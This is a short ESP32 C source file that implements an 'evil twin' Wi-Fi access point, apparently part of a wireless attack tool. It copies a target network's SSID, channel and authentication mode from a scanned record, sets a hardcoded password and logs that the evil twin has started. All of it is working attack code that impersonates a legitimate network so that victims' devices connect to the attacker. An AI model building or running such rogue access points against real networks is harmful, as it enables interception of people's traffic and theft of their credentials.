#include <string.h>
#include "esp_wifi.h"
#include "esp_log.h"
#include "config.h"
#include "twins.h"

#define TAG "WiFi_Twins"

void start_twins_ap(wifi_ap_record_t *ap_info) {
    if (ap_info == NULL) return;
    wifi_config_t wifi_config = {
        .ap = {
            .ssid = TARGET_SSID,
            .password = "5b5f0dd368e080baa8d8ce197cff8c03fdaf9a2d4c9a2f647e8b5b015f5b3311",
            .channel = ap_info->primary,
            .authmode = ap_info->authmode,
            .ssid_len = strlen(TARGET_SSID),
            .max_connection = 1,
        },
    };
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_LOGI(TAG, "Evil twin AP started on channel %d", ap_info->primary);
}

void stop_twins_ap(void) {
    wifi_config_t wifi_config = {0};
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_LOGI(TAG, "Evil twin AP stopped");
}
